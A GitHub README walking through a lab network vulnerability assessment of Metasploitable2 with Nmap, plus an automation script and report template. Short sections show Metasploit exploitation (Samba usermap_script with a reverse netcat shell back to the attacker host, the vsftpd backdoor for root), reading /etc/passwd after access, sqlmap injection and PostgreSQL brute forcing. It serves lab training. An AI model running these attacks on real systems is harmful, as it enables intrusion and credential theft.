<h1 align="center"> NMAP FOR VULNERABILITY ASSESSMENT </h1>

# Network Vulnerability Assessment With Nmap

---
## Overview:
This repository demonstrates a **Network Vulnerability Assessment (NVA)** using **Nmap**. The target is **Metasploitable2 (IP: 192.168.127.129)** in a lab environment. This project includes scanning, analysis, and a professional report for real-world cybersecurity experience.

---
## Scope 

Attacker: Kali Linux (192.168.127.128)
Target: Metasploitable2 (192.168.127.129) 


---


## Table of Contents








---

# INTRODUCTION TO NMAP FOR NETWORK VULNERABILITY ASSESSMENT 



















---



# NMAP FOR NETWORK VULNERABILITY ASSESSMENT 

### Workspace Setup
Create a professional folder structure for the VA:
````
mkdir -p Vulnerability_Assessment/{scans,reports,notes,scripts}
cd Vulnerability_Assessment
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
````
<img width="643" height="270" alt="image" src="https://github.com/user-attachments/assets/e01b8f92-d6f8-4f4e-866a-f7b3f3da9659" />

---


## 1. Discovery (Host is Online)
### 1. Ping Sweep
````
ping -c 3 192.168.127.129
````
<img width="582" height="206" alt="image" src="https://github.com/user-attachments/assets/44c69390-2716-4191-828c-4b6d4e98e6c1" />



### 2. Alternative Nmap Ping Scan
````
nmap -sn 192.168.127.129
````
<img width="594" height="154" alt="image" src="https://github.com/user-attachments/assets/e03e6126-f0c9-4a44-b51c-e11fce271089" />

- Nmap’s ping scan checks if host is alive without scanning ports.
- Only proceed to scanning if host is live. Avoids wasted scans.




## 2. Enumeration (Port & Service Discovery)
### 1. Scan all TCP ports and detect services
````
nmap -p- -sV -O -T4 -oA scans/full_tcp_scan_$TIMESTAMP 192.168.127.129
````
<img width="915" height="782" alt="image" src="https://github.com/user-attachments/assets/836e4482-5b8c-4c98-84aa-b131e37681b8" />


- `-p-` : Scans all 65535 TCP ports (full port range).  
- `-sV` : Enables service version detection to identify application names and versions (e.g., OpenSSH 5.1, Apache 2.2).  
- `-O` : Enables OS detection to guess the target’s operating system based on network stack fingerprinting.  
- `-T4` : Sets the timing template to "aggressive" for faster scanning.  
- `-oA scans/full_tcp_scan_$TIMESTAMP` : Saves output in all formats (normal, XML, grepable) under the directory scans/ with a filename that includes the variable $TIMESTAMP (must be defined in the shell, e.g., export TIMESTAMP=$(date +%F_%T)).
- This command performs a comprehensive, fast TCP scan to identify all open ports, service versions, and the likely operating system, a standard step in penetration testing for full network reconnaissance. 



### 2. Optional Advanced Enumeration
#### 1. UDP scan
````
sudo nmap -sU -p 53,67,68,69,161 -T4 -oA scans/udp_scan_$TIMESTAMP 192.168.127.129
````
<img width="717" height="268" alt="image" src="https://github.com/user-attachments/assets/968a53bf-8fae-4df2-97eb-80a83f01221e" />

- `-sU` : Performs a UDP scan to detect open UDP services.  
- `-p 53,67,68,69,161` : Scans specific UDP ports:  
    - `53` : DNS  
    - `67/68` : DHCP (server/client)  
    - `69` : TFTP (Trivial File Transfer Protocol)  
    - `161` : SNMP (Simple Network Management Protocol)
- `-T4` : Sets timing template to "aggressive" for faster scanning.  
- `-oA scans/udp_scan_$TIMESTAMP` : Saves output in all formats (normal, XML, grepable) under scans/ with a filename that includes the variable $TIMESTAMP (must be defined, e.g., export TIMESTAMP=$(date +%F_%T)).
- This command performs a fast, targeted UDP scan on key service ports, commonly used in internal network assessments to identify misconfigured or exploitable UDP-based services. 


#### 2. Firewall evasion:
````
nmap -f -D RND:5 -T4 -oA scans/stealth_scan_$TIMESTAMP 192.168.127.129
````
<img width="635" height="547" alt="image" src="https://github.com/user-attachments/assets/421975ac-f09e-4f42-a300-3a3e993e2d13" />


- `-f` : Fragments packets into smaller pieces (8-byte chunks), making it harder for basic firewalls or IDS to detect the scan.  
- `-D RND:5` : Adds 5 random decoy IP addresses to the scan, making it appear as if the scan is coming from multiple sources — helps obscure the attacker's real IP.  
- `-T4` : Sets timing template to "aggressive" for faster scanning (faster than default, but may be noisier).  
- `-oA scans/stealth_scan_$TIMESTAMP` : Saves output in all formats (normal, XML, grepable) under the directory scans/ with a filename that includes the variable $TIMESTAMP (must be defined, e.g., export TIMESTAMP=$(date +%F_%T)).
- This command performs a fast, stealthy scan using packet fragmentation and spoofed decoys to evade detection — useful in environments with basic firewall/IDS protections. Based on Nmap.org, Nmap supports advanced techniques for scanning networks with firewalls and filters, making it flexible and powerful for security auditing.



## 3. Vulnerability Identification
### 1. Broad NSE Scripts
````
nmap -sV --script=vuln -oA scans/nse_vuln_$TIMESTAMP 192.168.127.129
````
<img width="983" height="664" alt="image" src="https://github.com/user-attachments/assets/e94cb792-e846-45d6-8753-1cb10096df25" />

<img width="973" height="681" alt="image" src="https://github.com/user-attachments/assets/94ce1db8-65c5-4cbf-8fed-8ea21b274f13" />

<img width="681" height="694" alt="image" src="https://github.com/user-attachments/assets/adc1b020-bad5-4b72-a6bc-447903d31251" />

<img width="974" height="691" alt="image" src="https://github.com/user-attachments/assets/75e1995f-decd-47f9-a2f2-7ae653994b21" />

<img width="984" height="674" alt="image" src="https://github.com/user-attachments/assets/e1e26cea-1c88-4397-8307-4edab3cbda53" />

<img width="813" height="642" alt="image" src="https://github.com/user-attachments/assets/5933ebba-a618-4ccd-9b7c-bf43e4c6bc91" />

<img width="853" height="542" alt="image" src="https://github.com/user-attachments/assets/e65f5118-2cd2-45b7-b2b0-083d675690b9" />


- `-sV` : Enables service version detection to identify application names and versions (e.g., Apache 2.2, OpenSSH 5.1).  
- `--script=vuln` : Runs Nmap Scripting Engine (NSE) scripts that detect known vulnerabilities (e.g., SQL injection, XSS, misconfigurations) on services. Leverages Nmap’s extensive library of over 7,000 version detection signatures and hundreds of NSE scripts.  
- `-oA scans/nse_vuln_$TIMESTAMP` : Saves output in all formats (normal, XML, grepable) under the scans/ directory with a filename that includes the variable $TIMESTAMP (must be defined, e.g., export TIMESTAMP=$(date +%F_%T)).
- This command performs a comprehensive vulnerability scan using NSE scripts to identify exploitable weaknesses in services running on the target. Based on Nmap.org, Nmap includes powerful features like the Nmap Scripting Engine (NSE), which allows automation of complex tasks such as vulnerability detection, making it a top choice for penetration testers and security professionals. 


#### How hacker can exploit this:
- run this command in metaploit
````
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.127.129
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.127.128
exploit
````
<img width="721" height="699" alt="image" src="https://github.com/user-attachments/assets/29bbc95d-673f-4099-a3a8-40a4e9205e23" />

This way that we can exploit this CVE.

- Post-Exploitation Tips
````
hostname
cat /etc/passwd
ifconfig
find / -name "*.txt" -o -name "*.conf" 2>/dev/null
````
<img width="662" height="633" alt="image" src="https://github.com/user-attachments/assets/bae1bb51-9e1f-42af-b6dc-590a988630ef" />

<img width="757" height="686" alt="image" src="https://github.com/user-attachments/assets/3083a710-c8a9-41fe-8b63-071ea424824e" />




### 2. SMB (Ports 139/445) – CVE-2007-2447 
````
nmap -p 139,445 --script=smb-vuln* -oA scans/smb_vuln_$TIMESTAMP 192.168.127.129
````
<img width="630" height="276" alt="image" src="https://github.com/user-attachments/assets/ff185c4f-79df-480c-9890-d656592e25e8" />

| **Script**            | **Checks For**               | **Result**     |
| --------------------- | ---------------------------- | -------------- |
| `smb-vuln-ms10-061`   | MS10-061 (Print Spooler RCE) | Not vulnerable |
| `smb-vuln-ms10-054`   | MS10-054 (SMB LPE)           | Not vulnerable |
| `smb-vuln-regsvc-dos` | Remote Registry DoS          | Script failed  |

- Why we Didn’t Detect CVE-2007-2447 (Samba RCE) 
We're scanning Metasploitable2, which is vulnerable to CVE-2007-2447 (Samba usermap script RCE), but we didn’t see it. 
- Because: 
    - The script smb-vuln-cve2007-2447 exists in Nmap’s NSE library.
    - But your command used --script=smb-vuln*, which should include it.
    - So why wasn’t it run?
     

### 3. FTP (Port 21)
````
nmap -p 21 --script=ftp-vsftpd-backdoor,ftp-anon -oA scans/ftp_vuln_$TIMESTAMP 192.168.127.129
````
<img width="828" height="421" alt="image" src="https://github.com/user-attachments/assets/ae9cad2d-b084-48e7-b35f-60978d588797" />


#### How hacker exploit it:
- Open other terminal:
````
ftp 192.168.127.129
````
<img width="587" height="306" alt="image" src="https://github.com/user-attachments/assets/b2fce9af-219a-407f-bbe1-fa90e147426a" />

It will connect via FTP. But until we know username and password.

- use metasploit
````
msfconsole
````
<img width="593" height="416" alt="image" src="https://github.com/user-attachments/assets/4af752d3-08d4-4210-8205-6f5d5137f181" />

````
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.127.129
run
````
<img width="631" height="402" alt="image" src="https://github.com/user-attachments/assets/5ced2647-a245-4c23-97d3-52cd5f31ae9e" />

- We can get root:
````
whoami
````
<img width="626" height="201" alt="image" src="https://github.com/user-attachments/assets/f9863703-a7a2-48a1-b317-081558fa35fe" />




### 4. HTTP (Port 80)
````
nmap -p 80 --script=http-enum,http-title,http-headers,http-robots.txt,http-sql-injection 192.168.127.129
````
<img width="787" height="727" alt="image" src="https://github.com/user-attachments/assets/c6f17a6e-1197-42ca-a1ab-5e05b6db6c27" />

<img width="691" height="325" alt="image" src="https://github.com/user-attachments/assets/3e5fda04-0fd8-4fff-b382-56351335d4fd" />

- `-p 80` : Scans only port 80 (HTTP).  
- `--script=...` : Runs specific Nmap Scripting Engine (NSE) scripts to gather web server information and detect vulnerabilities:  
    - `http-enum` : Enumerates common web paths (e.g., /admin, /login)  
    - `http-title` : Extracts the page title from the web server response  
    - `http-headers` : Retrieves server headers (e.g., Server, X-Powered-By)  
    - `http-robots.txt` : Checks robots.txt for disallowed paths  
    - `http-sql-injection` : Tests for basic SQL injection vulnerabilities
- This command performs a targeted web vulnerability scan on port 80, leveraging Nmap’s NSE library (as noted on Nmap.org) to detect misconfigurations and potential exploits. It is a key step in web application security assessment. 
     


#### What way that hacker exploit Port 80

##### Use sqlmap 
````
sqlmap -u "http://192.168.127.129/mutillidae/index.php?page=user-info.php" --batch --risk=3 --level=5
````
<img width="965" height="743" alt="image" src="https://github.com/user-attachments/assets/3537ed24-9974-49e8-b706-3c9a854ef202" />


- This we can dump databases, get admin credentials, or even execute OS commands if --os-shell works.

- Use Netcat or Telnet to grab the raw HTTP banner:
````
nc -nv 192.168.127.129 80
HEAD / HTTP/1.1
Host: 192.168.127.129
````
<img width="647" height="688" alt="image" src="https://github.com/user-attachments/assets/21662e12-2558-463f-ad23-e107636f19e5" />

- Use curl:
````
curl -I http://192.168.127.129
````
<img width="411" height="144" alt="image" src="https://github.com/user-attachments/assets/c9f5ab63-78ff-4254-aa2c-e48c3ef1184e" />




### 5. MySQL (Port 3306)
````
nmap -p 3306 --script=mysql-vuln-cve2012-2122 -oA scans/mysql_vuln_$TIMESTAMP 192.168.127.129
````
<img width="810" height="199" alt="image" src="https://github.com/user-attachments/assets/0e8af730-9b1a-4af3-96a5-2a936d169880" />



### 6. Telnet (Port 23)
````
nmap -p 23 --script=telnet-ntlm-info -oA scans/telnet_info_$TIMESTAMP 192.168.127.129
````
<img width="659" height="182" alt="image" src="https://github.com/user-attachments/assets/444078e5-ea1b-4eda-99c9-0900ba11354a" />



### 7. PostgreSQL (Port 5432)
````
nmap -p 5432 --script=pgsql-brute --script-args=passdb=/usr/share/wordlists/metasploit/postgres_default_pass.txt -oA scans/pgsql_brute_$TIMESTAMP 192.168.127.129
````
<img width="982" height="200" alt="image" src="https://github.com/user-attachments/assets/79f607da-c79d-4de2-912e-16161fe3441d" />

---



## 4. Full Script of NVA with Nmap

#### Work flow
- Creates the workspace
- Runs discovery (ping scan)
- Performs full TCP/UDP scans
- Runs NSE vulnerability scripts for SMB, FTP, HTTP, MySQL, Telnet, PostgreSQL
- Saves outputs in structured folders with timestamps
- Converts XML → HTML
- Generates a Markdown report and PDF including screenshots placeholders
- Handles logging and errors

#### 1. Save script:
````
mousepad NVA_Nmap.sh
````
````
#!/bin/bash
# ==========================================
# NVA Automation Script - Kali Linux
# Author: Your Name
# Description: Automated Network Vulnerability Assessment with Nmap
# ==========================================

# --- Configurable Variables ---
TARGET="192.168.127.129"      # Target IP
WORKSPACE="$HOME/Vulnerability_Assessment"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SCANS="$WORKSPACE/scans"
REPORTS="$WORKSPACE/reports"
IMAGES="$REPORTS/images"
FINAL_MD="$REPORTS/final/Network_VA_Report_$TIMESTAMP.md"
FINAL_PDF="$REPORTS/final/Network_VA_Report_$TIMESTAMP.pdf"
WORDLIST="/usr/share/wordlists/metasploit/postgres_default_pass.txt"
LOG_FILE="$WORKSPACE/nva_log_$TIMESTAMP.log"
VERBOSE=true   # Set to false to reduce console output

# --- Helper Functions ---
log() {
    echo -e "[*] $1"
    echo -e "[*] $1" >> $LOG_FILE
}

check_command() {
    command -v $1 >/dev/null 2>&1 || { log "Command $1 not found. Please install it."; exit 1; }
}

run_nmap() {
    local desc=$1
    local args=$2
    local outfile=$3
    log "$desc"
    nmap $args -oA "$outfile"
}

# --- Ensure Required Tools ---
for cmd in nmap xsltproc pandoc; do check_command $cmd; done

# --- Step 0: Create workspace ---
mkdir -p "$SCANS" "$REPORTS/final" "$IMAGES"
log "Workspace created at $WORKSPACE"

# --- Step 1: Discovery ---
log "Step 1: Host Discovery"
ping -c 3 $TARGET
run_nmap "Nmap Ping Scan" "-sn $TARGET" "$SCANS/ping_scan_$TIMESTAMP"

# --- Step 2: TCP Enumeration ---
run_nmap "Full TCP Scan & Service Detection" "-p- -sV -O -T4 $TARGET" "$SCANS/full_tcp_scan_$TIMESTAMP"

# --- Step 3: UDP Scan (common ports) ---
sudo run_nmap "UDP Scan (53,67,68,69,161)" "-sU -p 53,67,68,69,161 -T4 $TARGET" "$SCANS/udp_scan_$TIMESTAMP"

# --- Step 4: Stealth / Firewall Evasion Scan ---
run_nmap "Stealth / Decoy Scan" "-f -D RND:5 -T4 $TARGET" "$SCANS/stealth_scan_$TIMESTAMP"

# --- Step 5: Vulnerability Scans ---
run_nmap "Broad NSE Vulnerability Scan" "-sV --script=vuln $TARGET" "$SCANS/nse_vuln_$TIMESTAMP"
run_nmap "SMB Vulnerabilities (139/445)" "-p 139,445 --script=smb-vuln* $TARGET" "$SCANS/smb_vuln_$TIMESTAMP"
run_nmap "FTP Vulnerabilities (21)" "-p 21 --script=ftp-vsftpd-backdoor,ftp-anon $TARGET" "$SCANS/ftp_vuln_$TIMESTAMP"
run_nmap "HTTP Vulnerabilities (80)" "-p 80 --script=http-vuln-* $TARGET" "$SCANS/http_vuln_$TIMESTAMP"
run_nmap "MySQL Vulnerabilities (3306)" "-p 3306 --script=mysql-vuln-cve2012-2122 $TARGET" "$SCANS/mysql_vuln_$TIMESTAMP"
run_nmap "Telnet Info (23)" "-p 23 --script=telnet-ntlm-info $TARGET" "$SCANS/telnet_info_$TIMESTAMP"
run_nmap "PostgreSQL Brute Force (5432)" "-p 5432 --script=pgsql-brute --script-args=passdb=$WORDLIST $TARGET" "$SCANS/pgsql_brute_$TIMESTAMP"

# --- Step 6: Convert XML to HTML ---
log "Step 6: Convert Nmap XML to HTML"
for xmlfile in $SCANS/*.xml; do
    htmlfile="$REPORTS/$(basename $xmlfile .xml).html"
    xsltproc "$xmlfile" -o "$htmlfile" || log "Failed to convert $xmlfile"
done

# --- Step 7: Generate Markdown Report ---
log "Step 7: Generate Markdown Report"
cat > $FINAL_MD << EOL
# Network Vulnerability Assessment Report

**Target:** $TARGET  
**Date:** $(date)  
**Author:** Nin Kanong

---

## 1. Executive Summary
- Number of vulnerabilities found: [Insert numbers from scans]  
- Risk overview: [High/Medium/Low summary]  

---

## 2. Scope & Rules of Engagement
- Target IP: $TARGET  
- Ports and protocols tested: TCP/UDP, common services  
- Authorized and legal testing only  

---

## 3. Methodology
1. Host Discovery (Ping/Nmap)  
2. TCP & UDP Enumeration (Full port scan, OS detection, version detection)  
3. Vulnerability Identification (NSE scripts)  

---

## 4. Findings

| Service | Port | CVE | Risk | Recommendation |
|---------|------|-----|------|----------------|
| FTP     | 21   | CVE-2011-2523 | High | Disable anonymous login / patch vsftpd |
| SMB     | 445  | CVE-2007-2447 | High | Patch Samba / Restrict access |
| HTTP    | 80   | CVE-2011-3192 | Medium | Patch Apache / update modules |
| MySQL   | 3306 | CVE-2012-2122 | High | Update MySQL / enforce strong passwords |
| Telnet  | 23   | N/A           | Medium | Disable Telnet / use SSH |
| PostgreSQL | 5432 | N/A       | Low    | Change default passwords / monitor brute-force attempts |

---

## 5. Recommendations
- Patch all critical vulnerabilities immediately.  
- Disable unused or insecure services (Telnet, FTP).  
- Enforce strong password policies.  
- Schedule periodic vulnerability assessments and scans.  

---

## 6. Screenshots
- Add screenshots to \`$IMAGES/\` and reference them here.

---

## 7. Appendices
- Raw Nmap outputs: \`$SCANS/\`  
- HTML reports: \`$REPORTS/\`  

EOL

# --- Step 8: Convert Markdown → PDF ---
log "Step 8: Convert Markdown to PDF"
sudo apt install -y pandoc texlive-xetex
pandoc "$FINAL_MD" -o "$FINAL_PDF" --pdf-engine=xelatex

# --- Done ---
log "NVA Automation Completed"
log "PDF Report: $FINAL_PDF"
````
````
chmod +x NVA_Nmap.sh
````
<img width="292" height="99" alt="image" src="https://github.com/user-attachments/assets/1e028ad6-68d8-45d5-ad76-e57203f8ecdf" />


-  Run script:
<img width="653" height="790" alt="image" src="https://github.com/user-attachments/assets/5bbf057a-4e6f-4cc7-b4cd-7d4511ac392a" />

<img width="733" height="673" alt="image" src="https://github.com/user-attachments/assets/3cfeba98-20c5-47a6-aafd-47f444eda875" />

<img width="956" height="755" alt="image" src="https://github.com/user-attachments/assets/d48289d8-47a3-4bc9-9e55-6aaf1a2550a4" />

<img width="667" height="738" alt="image" src="https://github.com/user-attachments/assets/5911abf6-5749-4da8-9701-01c80327421a" />

<img width="936" height="776" alt="image" src="https://github.com/user-attachments/assets/25b30fe9-68a9-4688-9979-fab0e6c9e5d3" />

<img width="764" height="756" alt="image" src="https://github.com/user-attachments/assets/aab5667c-07a6-44cd-89f5-e66cf14030ac" />




---


## References
- [Nmap](https://nmap.org/)  
- [CVE Database](https://cve.mitre.org/)  

---

## Disclaimer
This report is for **educational and authorized testing only**. All findings should be remediated per organizational security policies. Unauthorized exploitation of vulnerabilities is illegal and unethical.

---


## Download/View Full PDF Report
[NVA_Report.docx](https://github.com/user-attachments/files/22198417/NVA_Report.docx)

---


##  Lab Practice Details
- **Conducted by:** : Nin Kanng(k4n0ng) 
- **Environment:** Authorized LAB (Metasploitable2)  
- **Date:** 08 September 2025  
- **Tools Used:** Nmap, NSE Scripts, Manual Validation  

---

 **End of Network Vulnerability Assessment with Nmap**  

---
